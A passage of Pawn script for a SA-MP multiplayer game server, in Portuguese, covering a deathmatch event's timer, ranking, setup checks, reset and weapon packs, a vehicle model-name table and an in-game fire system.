	if((esDM[evdmTempoDF] == 1) && (esDM[evdmTempo] <= 0))
	{
	    evdmGetTop(esDM[evdmTop]);

	    evDMreset();
	    foreach(Player, i)
	    {
	    	dmLimpar(i);
		}
	    return 1;
	}
	if((esDM[evdmTempoDF] == 1) && (esDM[evdmTempo] > 0))
	{
		new
			d_Horas1,
			d_Minut1,
			d_Segun1
		;
		formatSeconds(esDM[evdmTempo], d_Horas1, d_Minut1, d_Segun1);

	    format(gStr, 128, "~b~~h~%d ~w~~h~Minuto(s)~n~~r~~h~%d ~w~~h~Segundos", d_Minut1, d_Segun1);
		TextDrawSetString(dmiTimer[0], gStr);

		foreach(Player, i)
		{
		    if(epDM[i][dmParticipando] == 1 || IsPlayerAdmin(i))
		    {
		        TextDrawShowForPlayer(i, dmiTimer[0]);
		        TextDrawShowForPlayer(i, dmiTimer[1]);
			}
	    }

	    dmRanking();

	    esDM[evdmTempo] -= 1;
	    esDM[evdmTimer] = SetTimer("iniciarDMCount", 1000, false);
	}
	return 1;
}

stock dmGetPlayerHighestScores(array[][dm_rankingEnum], left, right)
{
    new
        tempLeft = left,
        tempRight = right,
        pivot = array[(left + right) / 2][dm_player_Score],
        tempVar
    ;
    while(tempLeft <= tempRight)
    {
        while(array[tempLeft][dm_player_Score] > pivot) tempLeft++;
        while(array[tempRight][dm_player_Score] < pivot) tempRight--;

        if(tempLeft <= tempRight)
        {
            tempVar = array[tempLeft][dm_player_Score], array[tempLeft][dm_player_Score] = array[tempRight][dm_player_Score], array[tempRight][dm_player_Score] = tempVar;
            tempVar = array[tempLeft][dm_player_ID], array[tempLeft][dm_player_ID] = array[tempRight][dm_player_ID], array[tempRight][dm_player_ID] = tempVar;
            tempLeft++, tempRight--;
        }
    }
    if(left < tempRight) dmGetPlayerHighestScores(array, left, tempRight);
    if(tempLeft < right) dmGetPlayerHighestScores(array, tempLeft, right);
}

stock dmLimpar(playerid)
{
    SetColor(playerid);
	epDM[playerid][dmParticipando] = 0;
	epDM[playerid][dm_Matou] = 0;
	epDM[playerid][dm_Morreu] = 0;
}

stock evDMcarregar(playerid)
{
	if(esDM[evdmCriado] == 0)
	{
		if(esDM[evdmArenaID] != 0 && esDM[evdmArenaIDDF] == 1)
		{
			if(esDM[evdmArmaIDDF][0] != 0 && esDM[evdmArmaIDDF][1] != 0 && esDM[evdmArmaIDDF][2] != 0)
			{
                if(esDM[evdmTempo] >= 3 && esDM[evdmTempoDF] == 1)
				{
					if(esDM[evdmColete] == 1 && esDM[evdmColeteDF] == 1 || esDM[evdmColeteDF] == 2)
					{
						if(esDM[evdmPremio] >= EVENT_MINPRE && esDM[evdmPremio] <= EVENT_MAXPRE && esDM[evdmPremioDF] == 1)
      					{
      					    if(esDM[evdmTopDF] == 1)
						 	{
						        new
						            infoShowDM[256],
									showevDM1[64],
									showevDM2[128],
									showevDM3[64],
									showevDM4[64],
									dmdefColete[4]
								;
								if(esDM[evdmColeteDF] == 1)
								{
								    dmdefColete = "Sim";
								}
								if(esDM[evdmColeteDF] == 2)
								{
								    dmdefColete = "Não";
								}
								format(showevDM1, sizeof(showevDM1), "\tInfo Evento\n\nArena definida - Sim\nArena ID - %d\n\n", esDM[evdmArenaID]);
								format(showevDM2, sizeof(showevDM2), "Armas por ID\nArmas ID 1- %s\nArmas ID 2- %s\nArmas ID 3- %s\n\n", GetWeaponNameByID(esDM[evdmArmaID][0]), GetWeaponNameByID(esDM[evdmArmaID][1]), GetWeaponNameByID(esDM[evdmArmaID][2]));
								format(showevDM3, sizeof(showevDM3), "Tempo em minutos - %d\n\nColete - %s\n\n", esDM[evdmTempoAM], dmdefColete);
                                format(showevDM4, sizeof(showevDM4), "Prêmio - R$%d", esDM[evdmPremio]);
								format(infoShowDM, sizeof(infoShowDM), "%s%s%s%s", showevDM1, showevDM2, showevDM3, showevDM4);
								ShowPlayerDialog(playerid, D_DMEVENT+17, DIALOG_STYLE_MSGBOX, "Evento carregado", infoShowDM, "OK", "Redefinir");

					         	esDM[evdmCarregado] = 1;
							}
					     	else
					    	{
					      		SendClientMessage(playerid, COR_ERRO, "Você precisa definir o top evento!");
					     	}
						}
						else
						{
							SendClientMessage(playerid, COR_ERRO, "Você precisa definir o prêmio!");
						}
      				}
					else
					{
						SendClientMessage(playerid, COR_ERRO, "Você precisa definir o colete!");
					}
				}
				else
				{
			  		SendClientMessage(playerid, COR_ERRO, "Você precisa definir o tempo!");
				}
			}
			else
			{
			    if(esDM[evdmArmaPKDF] != 0)
			    {
			 		if(esDM[evdmTempo] >= 3 && esDM[evdmTempoDF] == 1)
			 		{
						if(esDM[evdmColete] == 1 && esDM[evdmColeteDF] == 1 || esDM[evdmColeteDF] == 2)
						{
						    if(esDM[evdmPremio] >= EVENT_MINPRE && esDM[evdmPremio] <= EVENT_MAXPRE && esDM[evdmPremioDF] == 1)
						    {
						        if(esDM[evdmTopDF] == 1)
						        {
							        new
							            infoShowDM[256],
										showevDM1[64],
										showevDM2[64],
										showevDM3[64],
										showevDM4[64],
										dmdefColete[4]
									;
									if(esDM[evdmColeteDF] == 1)
									{
									    dmdefColete = "Sim";
									}
									if(esDM[evdmColeteDF] == 2)
									{
									    dmdefColete = "Não";
									}
									format(showevDM1, sizeof(showevDM1), "\tInfo Evento\n\nArena definida - Sim\nArena ID - %d\n\n", esDM[evdmArenaID]);
									format(showevDM2, sizeof(showevDM2), "Pack de Armas\nPack de Armas ID - %d\n\n", esDM[evdmArmaPK]);
									format(showevDM3, sizeof(showevDM3), "Tempo em minutos - %d\n\nColete - %s\n\n", esDM[evdmTempoAM], dmdefColete);
	                                format(showevDM4, sizeof(showevDM4), "Prêmio - R$%d", esDM[evdmPremio]);
									format(infoShowDM, sizeof(infoShowDM), "%s%s%s%s", showevDM1, showevDM2, showevDM3, showevDM4);
									ShowPlayerDialog(playerid, D_DMEVENT+17, DIALOG_STYLE_MSGBOX, "Evento carregado", infoShowDM, "OK", "Redefinir");

						         	esDM[evdmCarregado] = 1;
					         	}
					         	else
					         	{
					         	    SendClientMessage(playerid, COR_ERRO, "Você precisa definir o top evento!");
					         	}
						    }
						    else
							{
							    SendClientMessage(playerid, COR_ERRO, "Você precisa definir o prêmio!");
							}
      					}
						else
						{
						    SendClientMessage(playerid, COR_ERRO, "Você precisa definir o colete!");
						}
					}
					else
				    {
			    		SendClientMessage(playerid, COR_ERRO, "Você precisa definir o tempo!");
			    	}
			    }
			    else
			    {
		    		SendClientMessage(playerid, COR_ERRO, "Você precisa definir as armas ou pack armas!");
		    	}
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você precisa definir a arena!");
		}
	}
	else
	{
		SendClientMessage(playerid, COR_ERRO, "Já tem um evento de DM criado!");
	}
}

forward evdmGodPlayers();
public evdmGodPlayers()
{
	foreach(Player, i)
	{
		if(epDM[i][dmParticipando] == 1)
		{
		    SetPlayerHealth(i, 100.0);
		}
	}
	if(esDM[evdmAnt_B] > 0)
	{
		SetTimer("evdmGodPlayers", 1000, false);
	}
	return 1;
}


stock evDMreset()
{
    KillTimer(esDM[evdmTimer]);

	esDM[evdmCriado] = 0;
	esDM[evdmCarregado] = 0;

	esDM[evdmLiberado] = 0;

	esDM[evdmArenaID] = 0;
	esDM[evdmArenaIDDF] = 0;

	for(new i; i < 3; ++i)
	{
		esDM[evdmArmaID][i] = 0;
		esDM[evdmArmaIDDF][i] = 0;
	}

	esDM[evdmListarm] = 0;

	esDM[evdmArmaPK] = 0;
	esDM[evdmArmaPKDF] = 0;

	esDM[evdmTempo] = 0;
	esDM[evdmTempoAM] = 0;
	esDM[evdmTempoDF] = 0;

	esDM[evdmColete] = 0;
	esDM[evdmColeteDF] = 0;

	esDM[evdmPremio] = 0;
	esDM[evdmPremioDF] = 0;

	esDM[evdmTop] = 0;
	esDM[evdmTopDF] = 0;

	esDM[evdmGodMod] = 0;

    esDM[evdmAnt_B] = 0;

    esDM[evdmCount] = 0;

	foreach(Player, i)
	{
	    if(epDM[i][dmParticipando] == 1)
	    {
			SetPlayerPos(i, 1227.4470,-1817.2300,16.5938);
			SetPlayerInterior(i, 0);
			SetCameraBehindPlayer(i);
			TogglePlayerControllable(i, true);

            SetPlayerArmour(i, 0.0);

			epDM[i][dmParticipando] = 0;
			epDM[i][dm_Matou] = 0;
			epDM[i][dm_Morreu] = 0;

			dmLimpar(i);
			ResetPlayerWeapons(i);
		}
	}

	new
		score_Text[256] = "~n~"
	;

	for(new ii; ii < 5; ++ii)
	{
		format(score_Text, sizeof(score_Text), "%s~n~~g~~h~%d. ~w~~h~Ninguem", score_Text, ii + 1);
 		TextDrawHideForAll(dmColoText[ii]);
	}

	TextDrawSetString(dm_text_Top5[1], score_Text);

	TextDrawHideForAll(dm_text_Top5[0]);
	TextDrawHideForAll(dm_text_Top5[1]);

	TextDrawHideForAll(dmiTimer[0]);
	TextDrawHideForAll(dmiTimer[1]);
}

stock SetPosLocal(playerid, setArenaID)
{
	new
		Float:arx = saeArena[setArenaID - 1][0],
		Float:ary = saeArena[setArenaID - 1][1],
		Float:arz = saeArena[setArenaID - 1][2],
		ari = intArena[setArenaID - 1][0];
	SetPlayerPos(playerid, arx, ary, arz);
	SetPlayerInterior(playerid, ari);
}

stock dmPackSetPlayer(playerid, PackID)
{
	if(PackID == 1)
	{
	    GivePlayerWeapon(playerid, 31, 999);
	    GivePlayerWeapon(playerid, 34, 999);
	    GivePlayerWeapon(playerid, 28, 999);
	    GivePlayerWeapon(playerid, 26, 999);
	    GivePlayerWeapon(playerid, 5, 999);
	}
	if(PackID == 2)
	{
	    GivePlayerWeapon(playerid, 32, 999);
	    GivePlayerWeapon(playerid, 26, 999);
	    GivePlayerWeapon(playerid, 24, 999);
	    GivePlayerWeapon(playerid, 4, 999);
	    GivePlayerWeapon(playerid, 30, 999);
	}
	if(PackID == 3)
	{
	    GivePlayerWeapon(playerid, 30, 999);
	    GivePlayerWeapon(playerid, 3, 999);
	    GivePlayerWeapon(playerid, 22, 999);
	    GivePlayerWeapon(playerid, 29, 999);
	}
	if(PackID == 4)
	{
	    GivePlayerWeapon(playerid, 42, 999);
	    GivePlayerWeapon(playerid, 6, 999);
	    GivePlayerWeapon(playerid, 27, 999);
	    GivePlayerWeapon(playerid, 23, 999);
	}
	if(PackID == 5)
	{
	    GivePlayerWeapon(playerid, 38, 999);
	    GivePlayerWeapon(playerid, 42, 999);
	    GivePlayerWeapon(playerid, 39, 999);
	    GivePlayerWeapon(playerid, 40, 999);
	}
}

stock GetWeaponNameByID(wid)
{
    new
		gunname[32]
	;
    switch(wid)
    {
        case    1 .. 17,
                22 .. 43,
                46: GetWeaponName(wid, gunname, sizeof(gunname));
        case    0 : format(gunname, 32, "%s", "murro");
        case    18: format(gunname, 32, "%s", "Molotov Cocktail");
        case    44: format(gunname, 32, "%s", "Night Vis Goggles");
        case    45: format(gunname, 32, "%s", "Thermal Goggles");
        default: format(gunname, 32, "%s", "Invalid Weapon Id");

    }
    return gunname;
}

stock IsValidWeaponID(weaponid)
{
    if((weaponid > 0 && weaponid < 19) || (weaponid > 21 && weaponid < 47)) return 1;
    else return 0;
}

stock evdmGetTop(quantiaTops)
{
	new
		playerScores[MAX_PLAYERS][dm_rankingEnum],
		index
	;
	for(new i = 0; i != MAX_PLAYERS; ++i)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i) && epDM[i][dmParticipando] == 1)
		{
			playerScores[index][dm_player_Score] = epDM[i][dm_Matou];
			playerScores[index++][dm_player_ID] = i;
		}
	}
	dmGetPlayerHighestScores(playerScores,0,index);

	new
		score_Text[128],
		player_Name[20]
		//dmBig[512]
	;
	format(gStr, 128, "%d melhores:", quantiaTops);
	SendClientMessageToAll(-1, gStr);
	for(new ii; ii < quantiaTops; ++ii)
	{
		if(ii < index)
		{
	    	GetPlayerName(playerScores[ii][dm_player_ID], player_Name, sizeof(player_Name));
			format(score_Text, sizeof(score_Text), "{1E90FF}%d° {FF1E1E}%s (ID %d) - {FFFFFF}Pontos: {1E90FF}%d", ii + 1, player_Name, playerScores[ii][dm_player_ID], playerScores[ii][dm_player_Score]);
            //strcat(dmBig, score_Text);
			SendClientMessageToAll(-1, score_Text);
		}
		else
		{
			format(score_Text, sizeof(score_Text), "{1E90FF}%d° {FFFFFF}Ninguém\n", ii + 1);
			SendClientMessageToAll(-1, score_Text);
			//strcat(dmBig, score_Text);
		}
	}
	return 1;
}

//

/*stock veiculoSetPPlayer(playerid, modelo, Float:spawnX, Float:spawnY, Float:spawnZ, Float:spawnA, c_c1, c_c2, play2)
{
	new
		CarSlot = GetPlayerFreeSlot(playerid)
	;
	if(CarSlot == -1)
	{
		return SendClientMessage(play2, COR_ERRO, "Esse(a) jogador(a) atingiu o limite de veículos próprios!");
	}
	new
		s[128]
	;
	format(s, 128, "Sets/%s_VID_%d.ini", PlayerName(playerid), CarSlot);

	if(!fexist(s))
	{
		WE_CreateFile(s);
		WE_SetString(s, "s_Dono", PlayerName(playerid));
		WE_SetInt(s, "v_modelo", modelo);
		WE_SetFloat(s, "v_pox", spawnX);
		WE_SetFloat(s, "v_poy", spawnY);
		WE_SetFloat(s, "v_poz", spawnZ);
		WE_SetFloat(s, "v_angulo", spawnA);
		WE_SetInt(s, "v_cor_1", c_c1);
		WE_SetInt(s, "v_cor_2", c_c2);
	}

	PlayerCarModelo[playerid][CarSlot][CarID] = modelo;
	PlayerCarConectado[playerid][CarSlot][CarID] = -1;

	return 1;
}

stock coresPlayerSet(playerid, SlotID, colors1, colors2)
{
    PlayerCar[playerid][SlotID][Color1] = colors1;
    PlayerCar[playerid][SlotID][Color2] = colors2;

    ChangeVehicleColor(PlayerCarCreated[playerid], colors1, colors2);
	new
		s[128]
	;
	format(s, 128, "Sets/%s_VID_%d.ini", PlayerName(playerid), SlotID);

	WE_SetInt(s, "v_cor_1", colors1);
	WE_SetInt(s, "v_cor_2", colors2);
}

stock estacionarPlayerSet(playerid, SlotID)
{
	new
		Float:pos[4]
	;
	GetVehiclePos(PlayerCarCreated[playerid], pos[0], pos[1], pos[2]);
	GetVehicleZAngle(PlayerCarCreated[playerid], pos[3]);

	PlayerCar[playerid][SlotID][CposX] = pos[0];
	PlayerCar[playerid][SlotID][CposY] = pos[1];
	PlayerCar[playerid][SlotID][CposZ] = pos[2];
	PlayerCar[playerid][SlotID][CposA] = pos[3];

	new
		s[128]
	;
	format(s, 128, "Sets/%s_VID_%d.ini", PlayerName(playerid), SlotID);

	WE_SetFloat(s, "v_pox", pos[0]);
	WE_SetFloat(s, "v_poy", pos[1]);
	WE_SetFloat(s, "v_poz", pos[2]);
	WE_SetFloat(s, "v_angulo", pos[3]);
}

stock GetPlayerFreeSlot(playerid)
{
	for(new i; i < MAX_PLAYER_CARS; ++i)
	{
	    if(PlayerCarModelo[playerid][i][CarID] == -1)
	        return i;
	}
	return -1;
}

stock respawnPlayerSet(playerid, SlotID)
{
	SetVehiclePos(PlayerCarCreated[playerid],
	PlayerCar[playerid][SlotID][CposX],
	PlayerCar[playerid][SlotID][CposY],
	PlayerCar[playerid][SlotID][CposZ]);
	SetVehicleZAngle(PlayerCarCreated[playerid], PlayerCar[playerid][SlotID][CposA]);
}

stock localizarPlayerSet(playerid, SlotID)
{
	SendClientMessage(playerid, COR_AMARELO, "Seu veículo próprio foi localizado, para encontrá-lo vá em direção ao ''S'' em seu mapa.");
	SetPlayerMapIcon(playerid, 90, PlayerCar[playerid][SlotID][CposX], PlayerCar[playerid][SlotID][CposY], PlayerCar[playerid][SlotID][CposZ], 38,0,MAPICON_GLOBAL_CHECKPOINT);
}

stock ShowPlayerSets(playerid)
{
	new
		s[512], s1[64]
	;
	new
	    veiculos_sets[20],
	    contar_sets
	;
	for(new i; i < MAX_PLAYER_CARS; ++i)
	{
		if(PlayerCarModelo[playerid][i][CarID] != -1)
		{
			veiculos_sets[i] = PlayerCarModelo[playerid][i][CarID];
			contar_sets ++;
		    if(PlayerCarConectado[playerid][i][CarID] == 1)
		    {
		        format(s1, 64, "%s {00FF00}Spawnado\n", GetVehicleModelName(PlayerCarModelo[playerid][i][CarID]));
		    }
		    if(PlayerCarConectado[playerid][i][CarID] != 1)
		    {
		        format(s1, 64, "%s\n", GetVehicleModelName(PlayerCarModelo[playerid][i][CarID]));
		    }
			strcat(s, s1);
		}
	}
	//ShowModelSelectionMenuEx(playerid, veiculos_sets, contar_sets, "Sets Proprios", DIALOG_SET_LIST, 16.0, 0.0, -55.0);
	ShowPlayerDialog(playerid, DIALOG_SET_LIST, DIALOG_STYLE_LIST, "Seus veículos", s, "Selecionar", "Cancelar");
}*/

/*public OnPlayerModelSelectionEx(playerid, response, extraid, modelid)
{
	if(extraid == DIALOG_SET_LIST)
	{
	    SendClientMessage(playerid, -1, "Selectalbvelelelelelel");
	   	if(!response)
	    {
		    if(PlayerCarModelo[playerid][modelid][CarID] == -1)
			{
				return SendClientMessage(playerid, COR_ERRO, "Nenhum veículo para esse slot!");
			}
		    SetPVarInt(playerid, "CarID", modelid);
		    ShowPlayerDialog(playerid, DIALOG_SET_LIST+1, DIALOG_STYLE_LIST, "Opções set", "Conectar\nDesconectar\nEstacionar\nRespawn\nCores\nLocalizar\nVender {FFFFFF}R${00FF00}500k", "OK", "Cancelar");
		}
	}
	return 1;
}*/

/*stock PCar_ResetVars(playerid)
{
	for(new i; i < MAX_VEHICLES; ++i)
	{
		if(PCar_oInfo[i][car_DonoID] == playerid)
		{
		    PCar_oInfo[i][car_DonoID] = -1;
		    PCar_oInfo[i][car_ValidS] = 0;
		}
	}
	for(new i; i < MAX_PLAYER_CARS; ++i)
	{
 		PlayerCarConectado[playerid][i][CarID] = -1;
	}
	if(IsValidVehicle(PlayerCarCreated[playerid]))
	{
		DestroyVehicle(PlayerCarCreated[playerid]);
		PlayerCarCreated[playerid] = -1;
	}
	RemovePlayerMapIcon(playerid, 90);
}

stock setOcupado(setid)
{
	foreach(Player, i)
	{
		if(IsPlayerInVehicle(i, setid))
		{
		    if(GetPlayerState(i) == PLAYER_STATE_DRIVER || GetPlayerState(i) == PLAYER_STATE_PASSENGER)
			{
			    return 1;
			}
		}
	}
	return 0;
}

public PCar_PlayerConnect(playerid)
{
    PCar_ResetVars(playerid);

	new
		s[128]
	;

	for(new i; i < MAX_PLAYER_CARS; ++i)
	{
	    format(s, 128, "Sets/%s_VID_%d.ini", PlayerName(playerid), i);

	    if(fexist(s))
	    {
	        new
	            MODELO = WE_GetInt(s, "v_modelo")
			;
            PlayerCarModelo[playerid][i][CarID] = MODELO;
	    }
	    else
	    {
	        PlayerCarModelo[playerid][i][CarID] = -1;
		}
		PlayerCarConectado[playerid][i][CarID] = -1;
	}
}

forward PCar_PlayerSetConnect(playerid, cID);
public PCar_PlayerSetConnect(playerid, cID)
{
    if(PlayerCarConectado[playerid][cID][CarID] == 1)
    {
        format(gStr, 128, "Seu veículo próprio {FFFFFF}%s {FF0000}já está spawnado!", GetVehicleModelName(PlayerCarModelo[playerid][cID][CarID]));
        SendClientMessage(playerid, COR_ERRO, gStr);
        return 1;
    }


	new
		s[128]
	;
	format(s, 128, "Sets/%s_VID_%d.ini", PlayerName(playerid), cID);

	if(fexist(s))
	{
		new
			Float:pscP[4], pcoi[3]
		;
		pcoi[0] = WE_GetInt(s, "v_modelo");
		pcoi[1] = WE_GetInt(s, "v_cor_1");
		pcoi[2] = WE_GetInt(s, "v_cor_2");
		// Coordenadas spawn
		pscP[0] = WE_GetFloat(s, "v_pox");
		pscP[1] = WE_GetFloat(s, "v_poy");
		pscP[2] = WE_GetFloat(s, "v_poz");
		pscP[3] = WE_GetFloat(s, "v_angulo");

		PlayerCar[playerid][cID][CposX] = pscP[0];
		PlayerCar[playerid][cID][CposY] = pscP[1];
		PlayerCar[playerid][cID][CposZ] = pscP[2];
		PlayerCar[playerid][cID][CposA] = pscP[3];

        PlayerCarCreated[playerid] = CreateVehicle(pcoi[0], pscP[0], pscP[1], pscP[2], pscP[3], pcoi[1], pcoi[2], -1);

		PCar_oInfo[PlayerCarCreated[playerid]][car_DonoID] = playerid;

     	PCar_oInfo[PlayerCarCreated[playerid]][car_ValidS] = 1;

     	PlayerCarConectado[playerid][cID][CarID] = 1;
	}
	format(gStr, 128, "Seu veículo próprio {FFFFFF}%s {FFFF00}foi spawnado.", GetVehicleModelName(PlayerCarModelo[playerid][cID][CarID]));
 	SendClientMessage(playerid, COR_AMARELO, gStr);

 	RemovePlayerMapIcon(playerid, 90);

	return 1;
}

forward PCar_PlayerSetdisConnect(playerid, cID);
public PCar_PlayerSetdisConnect(playerid, cID)
{
    if(PlayerCarConectado[playerid][cID][CarID] != 1)
    {
        format(gStr, 128, "Seu veículo próprio {FFFFFF}%s {FF0000}não foi spawnado!", GetVehicleModelName(PlayerCarModelo[playerid][cID][CarID]));
        SendClientMessage(playerid, COR_ERRO, gStr);
        return 1;
    }

	PCar_ResetVars(playerid);

    PlayerCarConectado[playerid][cID][CarID] = -1;

	format(gStr, 128, "Seu veículo próprio {FFFFFF}%s {FFFF00}foi desconectado.", GetVehicleModelName(PlayerCarModelo[playerid][cID][CarID]));
 	SendClientMessage(playerid, COR_AMARELO, gStr);

	RemovePlayerMapIcon(playerid, 90);

	return 1;
}

public PCar_PlayerDisconnect(playerid)
{
	for(new i; i < MAX_PLAYER_CARS; ++i)
	{
 		PlayerCarModelo[playerid][i][CarID] = -1;
	}
    PCar_ResetVars(playerid);
    return 1;
}*/

/*stock IsValidVehicleSet(v)
{
    if(PCar_oInfo[v][car_ValidS] == 1) return true;
        else return false;
}*/

stock IsValidVehicleBombeiros(v)
{
    if(estCamB[v] == 1) return true;
        else return false;
}

stock GetVehicleModelName(v)
{
	new s[35];
 	switch((v))
	{
	    case 400:s="Landstalker";
	    case 401:s="Bravura";
	    case 402:s="Buffalo";
	    case 403:s="Linerunner";
	    case 404:s="Perenail";
	    case 405:s="Sentinel";
	    case 406:s="Dumper";
	    case 407:s="Firetruck";
	    case 408:s="Trashmaster";
	    case 409:s="Stretch";
	    case 410:s="Manana";
	    case 411:s="Infernus";
	    case 412:s="Voodoo";
	    case 413:s="Pony";
	    case 414:s="Mule";
	    case 415:s="Cheetah";
	    case 416:s="Ambulance";
	    case 417:s="Levetian";
	    case 418:s="Moonbeam";
	    case 419:s="Esperanto";
	    case 420:s="Taxi";
	    case 421:s="Washington";
	    case 422:s="Bobcat";
	    case 423:s="Mr Whoopee";
	    case 424:s="BF Injection";
	    case 425:s="Hunter";
	    case 426:s="Premier";
	    case 427:s="Enforcer";
	    case 428:s="Securicar";
	    case 429:s="Banshee";
	    case 430:s="Predator";
	    case 431:s="Bus";
	    case 432:s="Rhino";
	    case 433:s="Barracks";
	    case 434:s="Hotknife";
	    case 435:s="Artic Trailer 1";
	    case 436:s="Previon";
	    case 437:s="Coach";
	    case 438:s="Cabbie";
	    case 439:s="Stallion";
	    case 440:s="Rumpo";
	    case 441:s="RC Bandit";
	    case 442:s="Romero";
	    case 443:s="Packer";
	    case 444:s="Monster";
	    case 445:s="Admiral";
	    case 446:s="Squalo";
	    case 447:s="Seasparrow";
	    case 448:s="Pizza Boy";
	    case 449:s="Tram";
	    case 450:s="Artic Trailer 2";
	    case 451:s="Turismo";
	    case 452:s="Speeder";
	    case 453:s="Reefer";
	    case 454:s="Tropic";
	    case 455:s="Flatbed";
	    case 456:s="Yankee";
	    case 457:s="Caddy";
	    case 458:s="Solair";
	    case 459:s="Top Fun";
	    case 460:s="Skimmer";
	    case 461:s="PCJ-600";
	    case 462:s="Faggio";
	    case 463:s="Freeway";
	    case 464:s="RC Baron";
	    case 465:s="RC Raider";
	    case 466:s="Glendale";
	    case 467:s="Oceanic";
	    case 468:s="Sanchez";
	    case 469:s="Sparrow";
	    case 470:s="Patriot";
	    case 471:s="Quad";
	    case 472:s="Coastguard";
	    case 473:s="Dinghy";
	    case 474:s="Hermes";
	    case 475:s="Sabre";
	    case 476:s="Rustler";
	    case 477:s="ZR-350";
	    case 478:s="Walton";
	    case 479:s="Regina";
	    case 480:s="Comet";
	    case 481:s="BMX";
	    case 482:s="Burrito";
	    case 483:s="Camper";
	    case 484:s="Marquis";
	    case 485:s="Baggage";
	    case 486:s="Dozer";
	    case 487:s="Maverick";
	    case 488:s="SAN Maverick";
	    case 489:s="Rancher";
	    case 490:s="POL_FEDERAL Rancher";
	    case 491:s="Virgo";
	    case 492:s="Greenwood";
	    case 493:s="Jetmax";
	    case 494:s="Hotring";
	    case 495:s="Sandking";
	    case 496:s="Blista Compact";
	    case 497:s="Police Maverick";
	    case 498:s="Boxvillie";
	    case 499:s="Benson";
	    case 500:s="Mesa";
	    case 501:s="RC Goblin";
	    case 502:s="Hotring";
	    case 503:s="Hotring";
	    case 504:s="Bloodring Banger";
	    case 505:s="Rancher";
	    case 506:s="Super GT";
	    case 507:s="Elegant";
	    case 508:s="Journey";
	    case 509:s="Bike";
	    case 510:s="Mountain Bike";
	    case 511:s="Beagle";
	    case 512:s="Cropduster";
	    case 513:s="Stuntplane";
	    case 514:s="Petrol";
	    case 515:s="Roadtrain";
	    case 516:s="Nebula";
	    case 517:s="Majestic";
	    case 518:s="Buccaneer";
	    case 519:s="Shamal";
	    case 520:s="Hydra";
	    case 521:s="FCR-900";
	    case 522:s="NRG-500";
	    case 523:s="HPV-1000";
	    case 524:s="Cement Truck";
	    case 525:s="Tow Truck";
	    case 526:s="Fortune";
	    case 527:s="Cadrona";
	    case 528:s="POL_FEDERAL Truck";
	    case 529:s="Williard";
	    case 530:s="Forklift";
	    case 531:s="Tractor";
	    case 532:s="Combine";
	    case 533:s="Feltzer";
	    case 534:s="Remington";
	    case 535:s="Slamvan";
	    case 536:s="Blade";
	    case 537:s="Freight";
	    case 538:s="Streak";
	    case 539:s="Vortex";
	    case 540:s="Vincent";
	    case 541:s="Bullet";
	    case 542:s="Clover";
	    case 543:s="Sadler";
	    case 544:s="Firetruck";
	    case 545:s="Hustler";
	    case 546:s="Intruder";
	    case 547:s="Primo";
	    case 548:s="Cargobob";
	    case 549:s="Tampa";
	    case 550:s="Sunrise";
	    case 551:s="Merit";
	    case 552:s="Utility Van";
	    case 553:s="Nevada";
	    case 554:s="Yosemite";
	    case 555:s="Windsor";
	    case 556:s="Monster";
	    case 557:s="Monster";
	    case 558:s="Uranus";
	    case 559:s="Jester";
	    case 560:s="Sultan";
	    case 561:s="Stratum";
	    case 562:s="Elegy";
	    case 563:s="Raindance";
	    case 564:s="RC Tiger";
	    case 565:s="Flash";
	    case 566:s="Tahoma";
	    case 567:s="Savanna";
	    case 568:s="Bandito";
	    case 569:s="Freight Flat";
	    case 570:s="Streak";
	    case 571:s="Kart";
	    case 572:s="Mower";
	    case 573:s="Duneride";
	    case 574:s="Sweeper";
	    case 575:s="Broadway";
	    case 576:s="Tornado";
	    case 577:s="AT-400";
	    case 578:s="DFT-30";
	    case 579:s="Huntley";
	    case 580:s="Stafford";
	    case 581:s="BF-400";
	    case 582:s="News van";
	    case 583:s="Tug";
	    case 584:s="Petrol Tanker";
	    case 585:s="Emperor";
	    case 586:s="Wayfarer";
	    case 587:s="Euros";
	    case 588:s="Hotdog";
	    case 589:s="Club";
	    case 590:s="Freight Box";
	    case 591:s="Artic Trailer";
	    case 592:s="Andromada";
	    case 593:s="Dodo";
	    case 594:s="RC Cam";
	    case 595:s="Launch";
	    case 596:s="Cop Car LS";
	    case 597:s="Cop Car SF";
	    case 598:s="Cop Car LV";
	    case 599:s="Ranger";
	    case 600:s="Picador";
	    case 601:s="POL_FEDERAL Tank";
	    case 602:s="Alpha";
	    case 603:s="Phoenix";
	    case 604:s="Glendale";
	    case 605:s="Sadler";
	    case 606:s="Bag Box";
	    case 607:s="Bag Box";
	    case 608:s="Stairs";
	    case 609:s="Boxville";
	    case 610:s="Farm Trailer";
	    case 611:s="Utility Trailer";
	}
	return s;
}

public HealthDown()
{
	for(new i = 0; i < MaxFire; ++i)
	{
		if(IsValidFire(i))
		{
			for(new p = 0; p < MAX_PLAYERS; ++p)
			{
				if(IsPlayerInRangeOfPoint(p, 1, FirePos[i][0], FirePos[i][1], FirePos[i][2]) && !IsPlayerInAnyVehicle(p))
				{
	  				new
					  	Float:HP
				  	;
		    		GetPlayerHealth(p, HP);
	  				SetPlayerHealth(p, HP-4);
				}
			}
			for(new v = 0; v < MAX_VEHICLES; ++v)
			{
				if(VehicleToPoint(2, v, FirePos[i][0], FirePos[i][1], FirePos[i][2]))
				{
					new
						Float:HP
					;
		    		GetVehicleHealth(v, HP);
	  				SetVehicleHealth(v, HP-30);
				}
			}
		}
	}
}

stock AddFire(playerid, Float:x, Float:y, Float:z, Health)
{
	new
		ID = playerid
	;
	FireObj[ID] = CreateDynamicObject(3461, x, y, z-2.61,0,0, 0.0);
	FirePos[ID][0] = x, FirePos[ID][1] = y, FirePos[ID][2] = z;
	FireHealth[ID] = Health;
	FireHealthMax[ID] = Health;
	FireCreated[ID] = ID;
	new
	    size[24]
	;
	format(size, 24, "%s", PlayerName(playerid));
	FirePlayer[ID] = size;
	#if defined Labels
	    new
			string[128]
		;
	    format(string, sizeof(string), "Incêndio AQUI!\nPorcentagem Fogo\n(%d / %d)", FireHealth[ID], FireHealthMax[ID]);
	    FireText[ID] = Create3DTextLabel(string, 0xFFFFFFFFF, x, y, z, 20, 0);
	#endif
}

stock DeleteFire(ID)
{
	DestroyDynamicObject(FireObj[ID]);
	FireCreated[ID] = 0;
	FirePlayer[ID] = "Ninguém";
	FirePos[ID][0] = 0, FirePos[ID][1] = 0, FirePos[ID][2] = 0;
	#if defined Labels
	    Delete3DTextLabel(FireText[ID]);
	#endif
}

stock DeleteAllFire()
{
	for(new ID = 0; ID < MaxFire; ++ID)
	{
		DestroyDynamicObject(FireObj[ID]);
